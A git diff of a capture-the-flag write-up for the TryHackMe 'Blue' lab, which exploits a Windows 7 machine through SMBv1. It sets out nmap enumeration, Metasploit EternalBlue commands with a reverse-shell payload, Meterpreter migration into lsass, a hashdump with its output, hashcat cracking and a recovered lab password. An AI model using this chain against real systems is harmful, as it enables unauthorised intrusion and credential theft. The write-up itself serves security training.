@@ -1,3 +1,12 @@
+---
+title: Blue
+summary: TryHackMe beginner Windows exploitation room focused on SMB enumeration, MS17-010 EternalBlue exploitation, Meterpreter migration, hash dumping, and flag discovery.
+date: 2026-04-06
+tags: [TryHackMe, Windows, SMB, EternalBlue, Metasploit, Meterpreter, Hash Cracking]
+difficulty: easy
+os: Windows
+url: https://tryhackme.com/room/blue
+---
 
 # CTF Room: Blue
 - [Link to room](https://tryhackme.com/room/blue)
@@ -9,13 +18,13 @@ Deploy & hack into a Windows machine, leveraging common misconfigurations issues
 
 ## 2. Questions
 #### Task 1: Recon
-Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. **This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.**
+Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. **This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.**
 
 ### NMAP Scan
 ```bash
 nmap -sV -sC -Pn -p- blue.thm
 ```
-```bash  
+```bash
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 17:07 +0100
 Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
 Service scan Timing: About 33.33% done; ETC: 17:09 (0:00:22 remaining)
@@ -29,7 +38,7 @@ PORT      STATE SERVICE       VERSION
 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
 445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
 3389/tcp  open  ms-wbt-server Microsoft Terminal Service
-| rdp-ntlm-info: 
+| rdp-ntlm-info:
 |   Target_Name: JON-PC
 |   NetBIOS_Domain_Name: JON-PC
 |   NetBIOS_Computer_Name: JON-PC
@@ -50,20 +59,20 @@ Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
 |_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 0a:7f:8f:16:c0:c7 (unknown)
-| smb2-time: 
+| smb2-time:
 |   date: 2026-04-06T16:09:32
 |_  start_date: 2026-04-06T16:06:35
-| smb-os-discovery: 
+| smb-os-discovery:
 |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
 |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
 |   Computer name: Jon-PC
 |   NetBIOS computer name: JON-PC\x00
 |   Workgroup: WORKGROUP\x00
 |_  System time: 2026-04-06T11:09:32-05:00
-| smb2-security-mode: 
-|   2.1: 
+| smb2-security-mode:
+|   2.1:
 |_    Message signing enabled but not required
-| smb-security-mode: 
+| smb-security-mode:
 |   account_used: guest
 |   authentication_level: user
 |   challenge_response: supported
@@ -79,12 +88,12 @@ From this extensive scan, we can see that the following ports are open:
 - 135
 - 139
 - 445
-The machine is exposing its SMB service to us, older versions of SMB are well known to have been riddled with vulnerabilities, lets enumerate the service more and see what we have on this machine. 
+The machine is exposing its SMB service to us, older versions of SMB are well known to have been riddled with vulnerabilities, lets enumerate the service more and see what we have on this machine.
 ### SMB service enumeration
-```bash  
+```bash
 nmap -p445 --script smb-protocols blue.thm
 ```
-```bash  
+```bash
 tarting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 17:10 +0100
 Nmap scan report for blue.thm (10.80.187.168)
 Host is up (0.023s latency).
@@ -93,8 +102,8 @@ PORT    STATE SERVICE
 445/tcp open  microsoft-ds
 
 Host script results:
-| smb-protocols: 
-|   dialects: 
+| smb-protocols:
+|   dialects:
 |     NT LM 0.12 (SMBv1) [dangerous, but default]
 |     2.0.2
 |_    2.1
@@ -102,12 +111,12 @@ Host script results:
 Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
 ```
 
-Now, I will use the smb-enum-shares script to see what shares are accessible and if any have anonymous access. We find that this is not the case and so will need some credentials. Rats! 
+Now, I will use the smb-enum-shares script to see what shares are accessible and if any have anonymous access. We find that this is not the case and so will need some credentials. Rats!
 ### SMB share enumeration
-```bash  
+```bash
 nmap -p 139,445 --script smb-enum-shares blue.thm
 ```
-```bash  
+```bash
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 17:11 +0100
 Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
 NSE Timing: About 0.00% done
@@ -119,16 +128,16 @@ PORT    STATE SERVICE
 445/tcp open  microsoft-ds
 
 Host script results:
-| smb-enum-shares: 
+| smb-enum-shares:
 |   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
 |   account_used: <blank>
-|   \\10.80.187.168\ADMIN$: 
+|   \\10.80.187.168\ADMIN$:
 |     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
 |     Anonymous access: <none>
-|   \\10.80.187.168\C$: 
+|   \\10.80.187.168\C$:
 |     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
 |     Anonymous access: <none>
-|   \\10.80.187.168\IPC$: 
+|   \\10.80.187.168\IPC$:
 |     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
 |_    Anonymous access: READ
 
@@ -136,7 +145,7 @@ Nmap done: 1 IP address (1 host up) scanned in 19.97 seconds
 
 ```
 
-So, we know that we need credentials that we currently do not have. We also konw that this machine is using SMBv1. Lets investigate vulnerabilities within SMBv1 on Windows. Elementary my dear Watson, it would appear we have a vulnerability called **EternalBlue**... What is this? 
+So, we know that we need credentials that we currently do not have. We also konw that this machine is using SMBv1. Lets investigate vulnerabilities within SMBv1 on Windows. Elementary my dear Watson, it would appear we have a vulnerability called **EternalBlue**... What is this?
 
 
 **EternalBlue {MS17-010}**
@@ -149,12 +158,12 @@ So, we know that we need credentials that we currently do not have. We also konw
 #### Task 2: Gaining Access
 Exploit the machine and gain a foothold.
 
-Lets start up metasploit and take advantage of this vulnerability using the pre-packaged exploit. 
+Lets start up metasploit and take advantage of this vulnerability using the pre-packaged exploit.
 ### Starting Metasploit and locating the package
-```bash  
+```bash
 msfconsole
 ```
-```bash  
+```bash
 msf > search ms17-010
 
 Matching Modules
@@ -198,12 +207,12 @@ Interact with a module by name or index. For example info 29, use 29 or use expl
 After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
 ```
 ### EternalBlue configuration
-```bash  
+```bash
 use exploit/windows/smb/ms17_010_eternalblue
 
 msf6 exploit(windows/smb/ms17_010_eternalblue) > options
 ```
-```bash  
+```bash
 msf > use 0
 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
 msf exploit(windows/smb/ms17_010_eternalblue) > show options
@@ -246,36 +255,36 @@ View the full module info with the info, or info -d command.
 
 ```
 
-Now that we have the options for this exploit, we can set it ready to run and exploit the machine :) 
+Now that we have the options for this exploit, we can set it ready to run and exploit the machine :)
 
-### EternalBlue set options 
-```bash  
-set RHOSTS blue.thm 
+### EternalBlue set options
+```bash
+set RHOSTS blue.thm
 set payload windows/x64/shell/reverse_tcp
-run 
+run
 ```
 
 We should see that the exploit has run and we have gained a shell on the machine, if not go back a step and ensure all settings are correct. Assuming you have made it to this stage, lets now try and upgrade to a Meterpreter shell!
 
 #### Task 3: Escalate
-Escalate privileges, learn how to upgrade shells in metasploit.
+Escalate privileges, learn how to upgrade shells in metasploit.
 
 **Meterpreter Shells**
 > When using MSF, we can upgrade from a regular shell to a meterpreter shell, this is a native metasploit shell that gives us many more features than a regular shell like being able to quickly deploy kiwi (mimikatz) to escalate to root.
 >
 > To do this, we can use the package: **post/multi/manage/shell_to_meterpreter**
 
-```bash  
+```bash
 sessions -u 2
 ```
 
-Now that we have a meterpreter session on the machine, lets use ps to investigate the processes on this system. 
+Now that we have a meterpreter session on the machine, lets use ps to investigate the processes on this system.
 
 
-```bash  
+```bash
 ps
 ```
-```  
+```text
 Process List
 ============
 
@@ -319,10 +328,10 @@ Process List
 
 We locate the process that is running as NT AUTHORITY\SYSTEM as **lsass.exe**. We migrate to it using its PID (**704**)
 
-```bash  
+```bash
 migrate 704
 ```
-```  
+```text
 
 ```
 
@@ -333,40 +342,40 @@ migrate 704
 #### Task 4: Cracking
 Dump the non-default user's password and crack it!
 
-As mentioned above we can run the command hashdump. 
+As mentioned above we can run the command hashdump.
 
-```bash  
+```bash
 hashdump
 
 echo "hash" >> Jon.hash
 ```
-```  
+```text
 meterpreter > migrate 704
 [*] Migrating from 2192 to 704...
 [*] Migration completed successfully.
 meterpreter > hashdump
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+Administrator:500:||aad3b435b51404eeaad3b435b51404ee||:||31d6cfe0d16ae931b73c59d7e0c089c0||:::
+Guest:501:||aad3b435b51404eeaad3b435b51404ee||:||31d6cfe0d16ae931b73c59d7e0c089c0||:::
+Jon:1000:||aad3b435b51404eeaad3b435b51404ee||:||ffb43f0de35be4d9917ac0cc8ad57f8d||:::
 
 ```
 
-Once we have the password hash for the non-default user (Jon) we can crack it using hashcat :) 
+Once we have the password hash for the non-default user (Jon) we can crack it using hashcat :)
 
-```bash  
+```bash
 hashcat -m 1000 /usr/share/wordlists/rockyou.txt Jon.hash
 ```
-```  
-hashed password > plaintext password :) 
+```text
+hashed password > plaintext password :)
 ```
 
-Now we have the credentials **Jon:alqfna22**, using this we can login legitimately at any time, the user belongs to us now. 
+Now we have the credentials **Jon:||alqfna22||**, using this we can login legitimately at any time, the user belongs to us now.
 
 #### Task 5: Find flags!
 Find the three flags planted on this machine. These are not traditional flags, rather, they're meant to represent key locations within the Windows system. Use the hints provided below to complete this room!
 
-Lets start at the root directory, could there be a flag there? 
-```bash  
+Lets start at the root directory, could there be a flag there?
+```bash
 cd C:\
 dir
 cat flag1.txt
@@ -391,7 +400,7 @@ Mode              Size   Type  Last modified              Name
 000000/---------  0      fif   1970-01-01 01:00:00 +0100  hiberfil.sys
 000000/---------  0      fif   1970-01-01 01:00:00 +0100  pagefile.sys
 
-```  
+```
 
 Next, can we find a flag where passwords are stored on Windows, lets have a look...
 ```bash
@@ -399,18 +408,18 @@ cd C:\Windows\System32\Config
 pwd
 dir | findstr "flag*"
 ```
-```
-flag2.txt should be visible! 
+```text
+flag2.txt should be visible!
 ```
 
-Great Success! Now, lets find flag 3, we know that it is in an excellent location to loot, lets have a look in Jon's Documents folder... 
-```
+Great Success! Now, lets find flag 3, we know that it is in an excellent location to loot, lets have a look in Jon's Documents folder...
+```text
 cd C:\Users\Jon\Documents
 pwd
 dir
 ```
-```
-flag3.txt is in there! 
+```text
+flag3.txt is in there!
 ```
 
-Perfect! 3 flags retrieved, very well done :) 
+Perfect! 3 flags retrieved, very well done :)
